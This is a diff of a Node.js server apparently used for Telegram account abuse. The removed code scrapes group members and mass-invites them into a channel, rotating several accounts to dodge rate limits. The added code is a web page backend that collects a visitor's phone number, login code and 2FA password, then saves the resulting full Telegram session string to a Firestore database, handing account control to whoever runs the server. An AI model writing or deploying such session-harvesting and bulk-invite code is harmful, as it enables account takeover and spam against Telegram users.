@@ -1,301 +1,188 @@
-import 'dotenv/config'
-import express from 'express'
-import { initializeApp } from 'firebase/app'
-import { getDatabase, ref, update, get, push } from 'firebase/database'
-import { TelegramClient, Api } from 'telegram'
-import { StringSession } from 'telegram/sessions/index.js'
-import path from 'path'
-import { fileURLToPath } from 'url'
+require('dotenv').config();
+const express = require('express');
+const path = require('path');
+const crypto = require('crypto');
 
-const app = express()
-app.use(express.json())
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const { Api } = require('telegram');
 
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)) }
+const admin = require('firebase-admin');
+const serviceAccount = require('./serviceAccountKey.json');
 
-// ===== Firebase =====
-const firebaseConfig = {
-  apiKey: process.env.FIREBASE_API_KEY,
-  authDomain: process.env.FIREBASE_AUTH_DOMAIN,
-  databaseURL: process.env.FIREBASE_DB_URL
-}
-initializeApp(firebaseConfig)
-const db = getDatabase()
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+});
 
-// ===== Accounts =====
-const accounts = []
-const clients = {}
+const db = admin.firestore();
 
-let i=1
-while(process.env[`TG_ACCOUNT_${i}_PHONE`]){
-  const api_id=Number(process.env[`TG_ACCOUNT_${i}_API_ID`])
-  const api_hash=process.env[`TG_ACCOUNT_${i}_API_HASH`]
-  const session=process.env[`TG_ACCOUNT_${i}_SESSION`]
-  const phone=process.env[`TG_ACCOUNT_${i}_PHONE`]
+const app = express();
 
-  if(!api_id||!api_hash||!session){i++; continue}
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('.'));
 
-  accounts.push({
-    phone, api_id, api_hash, session,
-    id:`TG_ACCOUNT_${i}`,
-    status:"pending",
-    floodWaitUntil:null
-  })
-  i++
+// ================= CONFIG =================
+const apiId = parseInt(process.env.API_ID);
+const apiHash = process.env.API_HASH;
+
+// temp session store
+const tempSessions = {};
+
+// ================= OPTIONAL ENCRYPT =================
+const SECRET = process.env.SECRET_KEY || "my_secret";
+
+function encrypt(text) {
+  return crypto.createHash('sha256').update(text + SECRET).digest('hex');
 }
 
-// ===== Client =====
-async function getClient(account){
-  if(clients[account.id]) return clients[account.id]
-  const client=new TelegramClient(
-    new StringSession(account.session),
-    account.api_id,
-    account.api_hash,
-    {connectionRetries:5}
-  )
-  await client.connect()
-  clients[account.id]=client
-  return client
-}
+// ================= UI =================
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
 
-// ===== Flood Parse =====
-function parseFlood(err){
-  const msg=err.message||""
-  const m1=msg.match(/FLOOD_WAIT_(\d+)/)
-  const m2=msg.match(/wait of (\d+) seconds/i)
-  if(m1) return Number(m1[1])
-  if(m2) return Number(m2[1])
-  return null
-}
+app.get('/favicon.ico', (req, res) => res.status(204));
 
-// ===== Auto Clear FloodWait =====
-async function refreshAccountStatus(account){
-  if(account.floodWaitUntil && account.floodWaitUntil < Date.now()){
-    account.floodWaitUntil = null
-    account.status = "active"
-    await update(ref(db, `accounts/${account.id}`), {
-      status: "active",
-      floodWaitUntil: null
-    })
-  }
-}
+// ================= STEP 1: SEND OTP =================
+app.post('/send-otp', async (req, res) => {
+  let { phone } = req.body;
 
-// ===== Check Account =====
-async function checkTGAccount(account){
-  try{
-    await refreshAccountStatus(account)
-    const client=await getClient(account)
-    await client.getMe()
-
-    account.status="active"
-    account.floodWaitUntil=null
-
-    await update(ref(db,`accounts/${account.id}`),{
-      status:"active",
-      phone:account.phone,
-      lastChecked:Date.now(),
-      floodWaitUntil:null
-    })
-
-  }catch(err){
-    const wait=parseFlood(err)
-
-    let status="error", floodUntil=null
-
-    if(wait){
-      status="floodwait"
-      floodUntil=Date.now()+wait*1000
-      account.floodWaitUntil=floodUntil
-      account.status="floodwait"
-    }
-
-    await update(ref(db,`accounts/${account.id}`),{
-      status,
-      floodWaitUntil:floodUntil,
-      error:err.message,
-      phone:account.phone,
-      lastChecked:Date.now()
-    })
-  }
-}
-
-// ===== Auto Check =====
-async function autoCheck(){
-  for(const acc of accounts){
-    await refreshAccountStatus(acc)
-    await checkTGAccount(acc)
-    await sleep(2000)
-  }
-}
-setInterval(autoCheck,60000)
-autoCheck()
-
-// ===== Get Available Account =====
-function getAvailableAccount(){
-  const now = Date.now()
-  return accounts.find(a => a.status === "active" && (!a.floodWaitUntil || a.floodWaitUntil < now))
-}
-
-// ===== Members =====
-app.post('/members',async(req,res)=>{
-  try{
-    const {group}=req.body
-    const acc = getAvailableAccount()
-    if(!acc) return res.json({error:"No active account"})
-    const client=await getClient(acc)
-    const entity=await client.getEntity(group)
-
-    let offset=0, limit=200, all=[]
-    while(true){
-      const participants=await client.getParticipants(entity,{limit,offset})
-      if(!participants.length) break
-      all=all.concat(participants)
-      offset+=participants.length
-    }
-
-    const members=all.filter(p=>!p.bot).map(p=>({
-      user_id:p.id,
-      username:p.username,
-      access_hash:p.access_hash,
-      avatar:`https://t.me/i/userpic/320/${p.id}.jpg`
-    }))
-
-    res.json(members)
-  }catch(err){
-    res.json({error:err.message})
-  }
-})
-
-// ===== Export Target Group Members =====
-app.post('/export-members', async(req,res)=>{
-  try{
-    const {targetGroup}=req.body
-    if(!targetGroup) return res.json({error:"Missing targetGroup"})
-
-    const acc = getAvailableAccount()
-    if(!acc) return res.json({error:"No active account"})
-
-    const client = await getClient(acc)
-    const entity = await client.getEntity(targetGroup)
-
-    let offset=0, limit=200, all=[]
-    while(true){
-      const participants = await client.getParticipants(entity,{limit,offset})
-      if(!participants.length) break
-      all.push(...participants)
-      offset+=participants.length
-    }
-
-    const members = all.filter(p=>!p.bot).map(p=>({
-      user_id:p.id,
-      username:p.username,
-      access_hash:p.access_hash,
-      avatar:`https://t.me/i/userpic/320/${p.id}.jpg`
-    }))
-
-    res.json({count:members.length, members})
-  }catch(err){
-    res.json({error:err.message})
-  }
-})
-
-// ===== Add Member =====
-app.post('/add-member', async (req, res) => {
   try {
-    const { username, user_id, access_hash, targetGroup } = req.body
+    phone = String(phone).trim();
+    if (!phone.startsWith('+')) phone = '+855' + phone;
 
-    const clientAcc = getAvailableAccount()
-    if (!clientAcc) return res.json({ status:"failed", reason:"All accounts FloodWait", accountUsed:"none" })
+    const client = new TelegramClient(
+      new StringSession(''),
+      apiId,
+      apiHash,
+      { connectionRetries: 5 }
+    );
 
-    if (!username && (!user_id || !access_hash)) return res.json({
-      status:"skipped",
-      reason:"missing username/access_hash",
-      accountUsed:"none",
-      silent:true
-    })
+    await client.connect();
 
-    const client = await getClient(clientAcc)
-    const group = await client.getEntity(targetGroup)
-
-    // ===== Auto export target members =====
-    const snap = await get(ref(db, `groups/${targetGroup.replace(/\./g,'_')}`))
-    const targetMembers = Object.values(snap.val()||{}).map(m=>m.username || m.user_id)
-    const id = username || user_id
-    if(targetMembers.includes(id)){
-      return res.json({
-        status:"skipped",
-        reason:"already in target group",
-        accountUsed:"none",
-        silent:true
+    const result = await client.invoke(
+      new Api.auth.SendCode({
+        phoneNumber: phone,
+        apiId,
+        apiHash,
+        settings: new Api.CodeSettings({})
       })
-    }
+    );
 
-    // ===== Check history =====
-    const histSnap = await get(ref(db, 'history'))
-    const histList = Object.values(histSnap.val() || {})
-    const alreadyHistory = histList.some(h => (h.username === username || h.user_id === user_id) && h.status === "success")
-    if(alreadyHistory) return res.json({ status:"skipped", reason:"already in history", accountUsed:"none", silent:true })
+    tempSessions[phone] = {
+      client,
+      phoneCodeHash: result.phoneCodeHash
+    };
 
-    let status="failed", reason="unknown"
-    try{
-      let userEntity
-      if(username) userEntity = await client.getEntity(username)
-      else userEntity = new Api.InputUser({ userId:user_id, accessHash:BigInt(access_hash) })
+    return res.json({ success: true });
 
-      await client.invoke(new Api.channels.InviteToChannel({ channel:group, users:[userEntity] }))
-
-      status="success"; reason="joined"
-      await sleep(30000 + Math.floor(Math.random()*10000))
-
-    }catch(err){
-      const wait=parseFlood(err)
-      if(wait){
-        const until=Date.now()+wait*1000
-        clientAcc.floodWaitUntil=until
-        clientAcc.status="floodwait"
-        await update(ref(db,`accounts/${clientAcc.id}`),{ status:"floodwait", floodWaitUntil:until })
-        const ready=new Date(until).toLocaleString()
-        reason=`FloodWait ${wait}s | Ready ${ready}`
-      } else reason=err.message
-    }
-
-    await push(ref(db,'history'),{ username, user_id, status, reason, accountUsed:clientAcc.id, timestamp:Date.now() })
-    res.json({ status, reason, accountUsed:clientAcc.id })
-
-  }catch(err){
-    res.json({ status:"failed", reason:err.message, accountUsed:"unknown" })
+  } catch (err) {
+    console.error("SEND OTP ERROR:", err);
+    return res.json({ success: false, error: err.message });
   }
-})
+});
 
-// ===== Account Status =====
-app.get('/account-status',async(req,res)=>{
-  const snap=await get(ref(db,'accounts'))
-  const now=Date.now()
-  const data=snap.val()||{}
+// ================= STEP 2: VERIFY OTP =================
+app.post('/login', async (req, res) => {
+  let { phone, otp } = req.body;
 
-  for(const id in data){
-    const a=data[id]
-    if(a.floodWaitUntil){
-      const remain=a.floodWaitUntil-now
-      if(remain<=0){
-        a.status="active"
-        a.floodWaitUntil=null
-        await update(ref(db,`accounts/${id}`),{ status:"active", floodWaitUntil:null })
-      } else a.remaining=remain
+  try {
+    phone = String(phone).trim();
+    if (!phone.startsWith('+')) phone = '+855' + phone;
+
+    const temp = tempSessions[phone];
+    if (!temp) return res.send("Session expired");
+
+    const { client, phoneCodeHash } = temp;
+
+    let needPassword = false;
+
+    try {
+      await client.signIn({
+        phoneNumber: phone,
+        phoneCode: String(otp),
+        phoneCodeHash
+      });
+
+    } catch (err) {
+      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
+        needPassword = true;
+      } else {
+        throw err;
+      }
     }
+
+    // ================= 2FA REQUIRED =================
+    if (needPassword) {
+      return res.send(`
+        <h3>🔐 Enter 2FA Password</h3>
+        <form method="POST" action="/login-password">
+          <input type="hidden" name="phone" value="${phone}" />
+          <input type="password" name="password" required />
+          <button type="submit">Continue</button>
+        </form>
+      `);
+    }
+
+    // ================= SAVE SESSION (NO 2FA) =================
+    const sessionString = client.session.save();
+
+    await db.collection('telegram_sessions').doc(phone).set({
+      phone,
+      sessionString,
+      has2FA: "nopass",
+      createdAt: admin.firestore.FieldValue.serverTimestamp()
+    });
+
+    delete tempSessions[phone];
+
+    return res.send("<h3>✅ Login success (no 2FA)</h3>");
+
+  } catch (err) {
+    console.error(err);
+    return res.send(`<h3>❌ ${err.message}</h3>`);
   }
-  res.json(data)
-})
+});
 
-// ===== History =====
-app.get('/history',async(req,res)=>{
-  const snap=await get(ref(db,'history'))
-  res.json(snap.val()||{})
-})
+// ================= STEP 3: 2FA PASSWORD =================
+app.post('/login-password', async (req, res) => {
+  let { phone, password } = req.body;
 
-// ===== Frontend =====
-const __filename=fileURLToPath(import.meta.url)
-const __dirname=path.dirname(__filename)
-app.get('/',(req,res)=>res.sendFile(path.join(__dirname,'index.html')))
+  try {
+    phone = String(phone).trim();
+    if (!phone.startsWith('+')) phone = '+855' + phone;
 
-const PORT=process.env.PORT||3000
-app.listen(PORT,()=>console.log(`🚀 Server running on ${PORT}`))
+    const temp = tempSessions[phone];
+    if (!temp) return res.send("Session expired");
+
+    const { client } = temp;
+
+    await client.signInWithPassword({
+      password: String(password)
+    });
+
+    const sessionString = client.session.save();
+
+    await db.collection('telegram_sessions').doc(phone).set({
+      phone,
+      sessionString,
+      has2FA: "pass",
+      passwordEncrypted: encrypt(password),
+      createdAt: admin.firestore.FieldValue.serverTimestamp()
+    });
+
+    delete tempSessions[phone];
+
+    return res.send("<h3>✅ Login success (2FA)</h3>");
+
+  } catch (err) {
+    console.error(err);
+    return res.send(`<h3>❌ ${err.message}</h3>`);
+  }
+});
+
+// ================= START =================
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log("Server running on port", PORT);
+});
